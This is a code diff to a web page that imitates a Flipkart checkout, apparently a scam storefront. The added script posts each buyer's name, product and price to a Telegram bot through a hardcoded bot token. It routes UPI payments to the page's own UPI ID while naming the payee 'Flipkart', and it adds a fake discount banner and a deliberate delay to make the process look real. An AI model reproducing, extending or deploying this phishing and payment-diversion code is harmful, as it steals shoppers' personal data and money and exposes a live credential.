@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -293,41 +294,69 @@
     </div>
 </div>
 
-    <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">
-        <nav class="fk-blue p-4 text-white flex items-center gap-4">
-            <i class="fa-solid fa-arrow-left" onclick="showPage('page-summary')"></i>
-            <span class="font-medium">Payments</span>
-        </nav>
-      <div class="flex items-center justify-between bg-white px-8 py-3 border-b text-[10px] font-medium text-gray-500">
-    <div class="flex flex-col items-center gap-1 text-blue-600">
-        <div class="w-5 h-5 rounded-full border-2 border-blue-600 flex items-center justify-center bg-blue-600 text-white">1</div>
-        <span>Address</span>
-    </div>
-    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
-    <div class="flex flex-col items-center gap-1">
-        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">2</div>
-        <span>Order Summary</span>
-    </div>
-    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
-    <div class="flex flex-col items-center gap-1">
-        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">3</div>
-        <span>Payment</span>
-    </div>
-</div>
-        <div class="p-4">
-            <div class="bg-white p-4 rounded shadow-sm">
-                <label class="flex items-center justify-between">
-                    <div class="flex gap-4 items-center">
-                        <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-6 h-6">
-                        <span class="font-bold">UPI (PhonePe / GPay)</span>
-                    </div>
-                    <input type="radio" checked>
-                </label>
-            </div>
-            <button onclick="confirmPay()" class="w-full btn-orange py-4 mt-8 shadow-xl uppercase font-bold">Place Order & Pay</button>
-        </div>
+   <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">
+    <nav class="bg-[#2874f0] p-4 text-white flex items-center gap-4">
+        <i class="fa-solid fa-arrow-left" onclick="showPage('page-summary')"></i>
+        <span class="font-medium text-lg">Payments</span>
+    </nav>
+
+    <div class="bg-yellow-100 p-2 text-center border-b border-yellow-200">
+        <p class="text-[12px] font-bold text-yellow-800">✨ Get up to 80% Discount on All UPI Payments ✨</p>
     </div>
 
+    <div class="p-4">
+        <h2 class="text-sm font-bold text-gray-600 mb-3">Select Your Payment Method</h2>
+        
+        <div class="bg-white rounded-sm shadow-sm overflow-hidden">
+            <div class="flex items-center justify-between p-4 border-b border-gray-100 cursor-pointer hover:bg-gray-50" onclick="triggerUPI('phonepe')">
+                <div class="flex items-center gap-4">
+                    <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-8 h-8">
+                    <span class="font-medium text-gray-700">PhonePe</span>
+                </div>
+                <div class="w-5 h-5 border-2 border-blue-600 rounded-full flex items-center justify-center">
+                    <div class="w-2.5 h-2.5 bg-blue-600 rounded-full"></div>
+                </div>
+            </div>
+
+            <div class="flex items-center justify-between p-4 border-b border-gray-100 cursor-pointer hover:bg-gray-50" onclick="triggerUPI('paytm')">
+                <div class="flex items-center gap-4">
+                    <img src="https://img.icons8.com/color/48/paytm.png" class="w-8 h-8">
+                    <span class="font-medium text-gray-700">Paytm</span>
+                </div>
+                <div class="w-5 h-5 border-2 border-gray-300 rounded-full"></div>
+            </div>
+
+            <div class="flex items-center justify-between p-4 cursor-pointer hover:bg-gray-50" onclick="triggerUPI('bhim')">
+                <div class="flex items-center gap-4">
+                    <img src="https://img.icons8.com/color/48/upi.png" class="w-8 h-8">
+                    <span class="font-medium text-gray-700">BHIM UPI</span>
+                </div>
+                <div class="w-5 h-5 border-2 border-gray-300 rounded-full"></div>
+            </div>
+        </div>
+
+        <div class="mt-4 bg-white p-4 rounded-sm shadow-sm">
+            <h3 class="text-sm font-bold border-b pb-2 mb-2">Price Details</h3>
+            <div class="flex justify-between text-sm py-1">
+                <span>Price (1 item)</span>
+                <span id="pay-mrp" class="text-gray-500">₹0</span>
+            </div>
+            <div class="flex justify-between text-sm py-1">
+                <span>Delivery Charges</span>
+                <span class="text-green-600">FREE</span>
+            </div>
+            <div class="flex justify-between text-lg font-bold border-t mt-2 pt-2">
+                <span>Amount Payable</span>
+                <span id="pay-total">₹0</span>
+            </div>
+        </div>
+    </div>
+    
+    <div class="p-6 text-center opacity-60">
+        <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/payment-method_69e7bc.svg" class="w-full grayscale opacity-50">
+        <p class="text-[10px] mt-2">Safe and secure payments. Easy returns. 100% Authentic products.</p>
+    </div>
+</div>
     <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
     <script>
         const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM";
@@ -533,16 +562,43 @@ let sel = null;
         } else { alert("Please fill all details"); }
     }
 
-    async function confirmPay() {
-        const name = document.getElementById('uName').value;
-        const phone = document.getElementById('uPhone').value;
-        const msg = `🔥 *NEW ORDER* 🔥\n📦 ${sel.name}\n💰 ₹${sel.price}\n👤 ${name}\n📞 ${phone}`;
-        
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+ async function confirmPay() {
+    // UI update for price
+    document.getElementById('pay-mrp').innerText = "₹" + (sel.mrp || sel.price);
+    document.getElementById('pay-total').innerText = "₹" + sel.price;
+    
+    // Telegram Alert
+    const msg = `💰 *PAYMENT STEP* 💰\n👤 ${document.getElementById('uName').value}\n📦 ${sel.name}\n💵 ₹${sel.price}`;
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-        const upiString = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR&tn=Order_${name}`;
-        window.location.href = upiString;
+    showPage('page-payment');
+}
+
+function triggerUPI(provider) {
+    const amount = sel.price;
+    const upiID = MY_UPI; 
+    const txnRef = "FK" + Date.now();
+    const upiString = `upi://pay?pa=${upiID}&pn=Flipkart&am=${amount}&cu=INR&mc=5411&tr=${txnRef}`;
+
+    // Browser ke "Leaving App" popup ko trigger karne ke liye
+    let intentUrl = upiString;
+
+    if (provider === 'phonepe') {
+        intentUrl = `intent://pay${upiString.replace('upi://pay', '')}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=${encodeURIComponent(window.location.href)};end`;
+    } else if (provider === 'paytm') {
+        intentUrl = `intent://pay${upiString.replace('upi://pay', '')}#Intent;scheme=upi;package=net.one97.paytm;S.browser_fallback_url=${encodeURIComponent(window.location.href)};end`;
     }
+
+    // 1 second ka delay taaki feel aaye ki process ho raha hai
+    alert("Redirecting to " + provider + "..."); 
+    
+    window.location.href = intentUrl;
+
+    // Backup
+    setTimeout(() => {
+        window.location.href = upiString;
+    }, 1500);
+}
 
     init();
 </script>
